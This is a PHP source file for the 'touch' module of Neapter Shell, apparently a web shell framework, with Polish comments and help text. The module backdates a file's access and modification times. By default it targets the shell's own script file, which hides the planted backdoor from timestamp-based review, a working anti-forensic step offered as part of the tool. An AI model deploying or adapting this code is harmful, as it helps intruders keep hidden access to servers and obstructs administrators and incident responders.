<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmiana daty dostepu i modyfikacji pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba3
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleTouch extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'touch' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-10-28 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Zmiana czasu dostępu i modyfikacji pliku

	Użycie
		touch data [plik]

	Przykład:
		touch 2011-10-10
		touch 2011-10-10 /tmp/test
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		$iParams = $this -> oShell -> getArgs() -> getNumberOfParams();

		if( ( $iParams !== 1 ) && ( $iParams !== 2 ) )
		{
			return $this -> getHelp();
		}

		/**
		 * Sprawdzanie czy plik istnieje
		 */
		$sFilePath = $this -> oShell -> getArgs() -> getParam( 1 );

		if( ( $sFilePath !== FALSE ) && ! is_file( $sFilePath ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $sFilePath );
		}

		/**
		 * Sciezka do "tego" pliku
		 */
		if( $sFilePath === FALSE )
		{
			$sFilePath = Request::getServer( 'SCRIPT_FILENAME' );
		}

		/**
		 * Czas modyfikacji / dostepu
		 */
		$iTime = strtotime( $this -> oShell -> getArgs() -> getParam( 0 ) );

		/**
		 * Zmiana czasu dostepu i modyfikacji
		 */
		if( touch( $sFilePath, $iTime, $iTime ) )
		{
			return 'Data modyfikacji i dostępu została zmieniona';
		}

		return 'Data modyfikacji i dostępu nie została zmieniona';
	}

}